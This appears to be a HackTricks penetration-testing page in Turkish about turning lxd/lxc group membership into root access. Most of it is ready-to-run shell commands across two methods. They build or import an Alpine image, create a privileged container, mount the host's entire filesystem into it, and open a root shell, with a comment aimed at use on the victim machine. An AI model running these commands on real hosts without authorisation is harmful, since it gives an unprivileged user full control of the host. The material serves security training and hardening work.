# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Host'un _**lxd**_ yönetim grubuna üyelik, daemon üzerinde tam kontrol sağlayarak root'a giden bir yol sunabilir.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

LXD ile kullanmak üzere güvenilir bir repository'den Alpine image indirebilirsiniz.
Canonical'ın LXD image server'ı günlük build'ler yayımlar: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
En yeni build'den (dizin adı tarihtir) yalnızca **lxd.tar.xz** ve **rootfs.squashfs** dosyalarını indirin.<sup>[[8]](#references)</sup>

Alternatif olarak, [proje talimatlarını](https://github.com/lxc/distrobuilder) izleyerek makinenize distrobuilder yükleyebilirsiniz.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz** (**Canonical image server** üzerinden indirdiyseniz **lxd.tar.xz**) ve **rootfs.squashfs** dosyalarını yükleyin, ardından image'ı içe aktarın ve bir container oluşturun.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Bu hatayı bulursanız _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** komutunu çalıştırın, varsayılan bir storage pool oluşturun, ardından önceki komut bloğunu **tekrarlayın**.<sup>[[2]](#references)</sup>

Son olarak container'ı başlatın ve host filesystem üzerinde bir root shell açın:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Bir Alpine image oluşturun ve `security.privileged=true` flag'iyle başlatın; bu, container root kullanıcısını host root kullanıcısıyla eşler. Ardından `/` dizinini mount etmek, host filesystem'ini container içinde açığa çıkarır.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [LXD için güvenlik nasıl güçlendirilir](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD container'ları ve sanal makineler](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Image'lar nasıl kopyalanır ve içe aktarılır](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder ile image'lar nasıl oluşturulur](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image tanımı](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script'i](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server'ı](https://images.lxd.canonical.com/)
- [9] [Tür: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
